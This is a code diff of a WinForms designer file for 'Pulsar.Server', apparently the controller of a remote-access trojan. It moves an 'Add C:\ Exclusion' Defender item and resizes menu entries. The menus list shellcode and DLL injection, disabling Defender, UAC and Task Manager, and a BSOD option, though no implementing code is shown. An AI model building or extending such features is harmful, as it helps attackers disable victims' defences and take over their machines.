@@ -88,7 +88,6 @@ namespace Pulsar.Server.Forms
             quickCommandsToolStripMenuItem = new ToolStripMenuItem();
             shellcodeRunnerToolStripMenuItem = new ToolStripMenuItem();
             injectDLLToolStripMenuItem = new ToolStripMenuItem();
-            addCDriveExceptionToolStripMenuItem = new ToolStripMenuItem();
             taskManagerToolStripMenuItem1 = new ToolStripMenuItem();
             enableToolStripMenuItem = new ToolStripMenuItem();
             disableTaskManagerToolStripMenuItem = new ToolStripMenuItem();
@@ -101,6 +100,7 @@ namespace Pulsar.Server.Forms
             windowsDefenderToolStripMenuItem = new ToolStripMenuItem();
             enableDefenderToolStripMenuItem = new ToolStripMenuItem();
             disableDefenderToolStripMenuItem = new ToolStripMenuItem();
+            addCExclusionToolStripMenuItem = new ToolStripMenuItem();
             funMethodsToolStripMenuItem = new ToolStripMenuItem();
             bSODToolStripMenuItem = new ToolStripMenuItem();
             cWToolStripMenuItem = new ToolStripMenuItem();
@@ -519,7 +519,7 @@ namespace Pulsar.Server.Forms
             // 
             // quickCommandsToolStripMenuItem
             // 
-            quickCommandsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { shellcodeRunnerToolStripMenuItem, injectDLLToolStripMenuItem, addCDriveExceptionToolStripMenuItem, taskManagerToolStripMenuItem1, uACToolStripMenuItem, virtualMonitorToolStripMenuItem1, windowsDefenderToolStripMenuItem });
+            quickCommandsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { shellcodeRunnerToolStripMenuItem, injectDLLToolStripMenuItem, taskManagerToolStripMenuItem1, windowsDefenderToolStripMenuItem, virtualMonitorToolStripMenuItem1, uACToolStripMenuItem });
             quickCommandsToolStripMenuItem.Image = Properties.Resources.wrench;
             quickCommandsToolStripMenuItem.Name = "quickCommandsToolStripMenuItem";
             quickCommandsToolStripMenuItem.Size = new Size(179, 22);
@@ -529,7 +529,7 @@ namespace Pulsar.Server.Forms
             // 
             shellcodeRunnerToolStripMenuItem.Image = Properties.Resources.shellcodeicon;
             shellcodeRunnerToolStripMenuItem.Name = "shellcodeRunnerToolStripMenuItem";
-            shellcodeRunnerToolStripMenuItem.Size = new Size(194, 22);
+            shellcodeRunnerToolStripMenuItem.Size = new Size(174, 22);
             shellcodeRunnerToolStripMenuItem.Text = "Inject Shellcode";
             shellcodeRunnerToolStripMenuItem.Click += shellcodeRunnerToolStripMenuItem_Click;
             // 
@@ -537,24 +537,16 @@ namespace Pulsar.Server.Forms
             // 
             injectDLLToolStripMenuItem.Image = Properties.Resources.dllinjectoricon;
             injectDLLToolStripMenuItem.Name = "injectDLLToolStripMenuItem";
-            injectDLLToolStripMenuItem.Size = new Size(194, 22);
+            injectDLLToolStripMenuItem.Size = new Size(174, 22);
             injectDLLToolStripMenuItem.Text = "Inject DLL";
             injectDLLToolStripMenuItem.Click += injectDLLToolStripMenuItem_Click;
-            // 
-            // addCDriveExceptionToolStripMenuItem
-            // 
-            addCDriveExceptionToolStripMenuItem.Image = Properties.Resources.application_view_xp_terminal;
-            addCDriveExceptionToolStripMenuItem.Name = "addCDriveExceptionToolStripMenuItem";
-            addCDriveExceptionToolStripMenuItem.Size = new Size(194, 22);
-            addCDriveExceptionToolStripMenuItem.Text = "Add C: Drive Exception";
-            addCDriveExceptionToolStripMenuItem.Click += addCDriveExceptionToolStripMenuItem_Click;
             // 
             // taskManagerToolStripMenuItem1
             // 
             taskManagerToolStripMenuItem1.DropDownItems.AddRange(new ToolStripItem[] { enableToolStripMenuItem, disableTaskManagerToolStripMenuItem });
             taskManagerToolStripMenuItem1.Image = Properties.Resources.cog;
             taskManagerToolStripMenuItem1.Name = "taskManagerToolStripMenuItem1";
-            taskManagerToolStripMenuItem1.Size = new Size(194, 22);
+            taskManagerToolStripMenuItem1.Size = new Size(174, 22);
             taskManagerToolStripMenuItem1.Text = "Task Manager";
             // 
             // enableToolStripMenuItem
@@ -578,14 +570,14 @@ namespace Pulsar.Server.Forms
             uACToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { enableUACToolStripMenuItem, disableUACToolStripMenuItem });
             uACToolStripMenuItem.Image = Properties.Resources.uac_shield;
             uACToolStripMenuItem.Name = "uACToolStripMenuItem";
-            uACToolStripMenuItem.Size = new Size(194, 22);
+            uACToolStripMenuItem.Size = new Size(174, 22);
             uACToolStripMenuItem.Text = "UAC";
             // 
             // enableUACToolStripMenuItem
             // 
             enableUACToolStripMenuItem.Image = Properties.Resources.uac_shield;
             enableUACToolStripMenuItem.Name = "enableUACToolStripMenuItem";
-            enableUACToolStripMenuItem.Size = new Size(139, 22);
+            enableUACToolStripMenuItem.Size = new Size(180, 22);
             enableUACToolStripMenuItem.Text = "Enable UAC";
             enableUACToolStripMenuItem.Click += enableUACToolStripMenuItem_Click;
             // 
@@ -593,7 +585,7 @@ namespace Pulsar.Server.Forms
             // 
             disableUACToolStripMenuItem.Image = Properties.Resources.uac_shield;
             disableUACToolStripMenuItem.Name = "disableUACToolStripMenuItem";
-            disableUACToolStripMenuItem.Size = new Size(139, 22);
+            disableUACToolStripMenuItem.Size = new Size(180, 22);
             disableUACToolStripMenuItem.Text = "Disable UAC";
             disableUACToolStripMenuItem.Click += disableUACToolStripMenuItem_Click;
             // 
@@ -602,7 +594,7 @@ namespace Pulsar.Server.Forms
             virtualMonitorToolStripMenuItem1.DropDownItems.AddRange(new ToolStripItem[] { installToolStripMenuItem, uninstallToolStripMenuItem1 });
             virtualMonitorToolStripMenuItem1.Image = Properties.Resources.virtualmonitoricon;
             virtualMonitorToolStripMenuItem1.Name = "virtualMonitorToolStripMenuItem1";
-            virtualMonitorToolStripMenuItem1.Size = new Size(194, 22);
+            virtualMonitorToolStripMenuItem1.Size = new Size(174, 22);
             virtualMonitorToolStripMenuItem1.Text = "Virtual Monitor";
             // 
             // installToolStripMenuItem
@@ -623,17 +615,17 @@ namespace Pulsar.Server.Forms
             // 
             // windowsDefenderToolStripMenuItem
             // 
-            windowsDefenderToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { enableDefenderToolStripMenuItem, disableDefenderToolStripMenuItem });
+            windowsDefenderToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { enableDefenderToolStripMenuItem, disableDefenderToolStripMenuItem, addCExclusionToolStripMenuItem });
             windowsDefenderToolStripMenuItem.Image = Properties.Resources.defendershieldicon;
             windowsDefenderToolStripMenuItem.Name = "windowsDefenderToolStripMenuItem";
-            windowsDefenderToolStripMenuItem.Size = new Size(194, 22);
+            windowsDefenderToolStripMenuItem.Size = new Size(174, 22);
             windowsDefenderToolStripMenuItem.Text = "Windows Defender";
             // 
             // enableDefenderToolStripMenuItem
             // 
             enableDefenderToolStripMenuItem.Image = Properties.Resources.defenderenableicon;
             enableDefenderToolStripMenuItem.Name = "enableDefenderToolStripMenuItem";
-            enableDefenderToolStripMenuItem.Size = new Size(163, 22);
+            enableDefenderToolStripMenuItem.Size = new Size(180, 22);
             enableDefenderToolStripMenuItem.Text = "Enable Defender";
             enableDefenderToolStripMenuItem.Click += enableDefenderToolStripMenuItem_Click;
             // 
@@ -641,9 +633,17 @@ namespace Pulsar.Server.Forms
             // 
             disableDefenderToolStripMenuItem.Image = Properties.Resources.defenderdisableicon;
             disableDefenderToolStripMenuItem.Name = "disableDefenderToolStripMenuItem";
-            disableDefenderToolStripMenuItem.Size = new Size(163, 22);
+            disableDefenderToolStripMenuItem.Size = new Size(180, 22);
             disableDefenderToolStripMenuItem.Text = "Disable Defender";
             disableDefenderToolStripMenuItem.Click += disableDefenderToolStripMenuItem_Click;
+            // 
+            // addCExclusionToolStripMenuItem
+            // 
+            addCExclusionToolStripMenuItem.Image = Properties.Resources.application_edit;
+            addCExclusionToolStripMenuItem.Name = "addCExclusionToolStripMenuItem";
+            addCExclusionToolStripMenuItem.Size = new Size(180, 22);
+            addCExclusionToolStripMenuItem.Text = "Add C:\\ Exclusion";
+            addCExclusionToolStripMenuItem.Click += addCExclusionToolStripMenuItem_Click;
             // 
             // funMethodsToolStripMenuItem
             // 
@@ -2344,7 +2344,6 @@ namespace Pulsar.Server.Forms
         private ToolStripMenuItem hideTaskBarToolStripMenuItem;
         private ToolStripStatusLabel listenToolStripStatusLabel;
         private ToolStripMenuItem quickCommandsToolStripMenuItem;
-        private ToolStripMenuItem addCDriveExceptionToolStripMenuItem;
         private ContextMenuStrip NotificationContextMenuStrip;
         private ToolStripMenuItem addKeywordsToolStripMenuItem;
         private ToolStripMenuItem clearSelectedToolStripMenuItem;
@@ -2496,5 +2495,6 @@ namespace Pulsar.Server.Forms
         private ToolStripMenuItem windowsDefenderToolStripMenuItem;
         private ToolStripMenuItem enableDefenderToolStripMenuItem;
         private ToolStripMenuItem disableDefenderToolStripMenuItem;
+        private ToolStripMenuItem addCExclusionToolStripMenuItem;
     }
 }
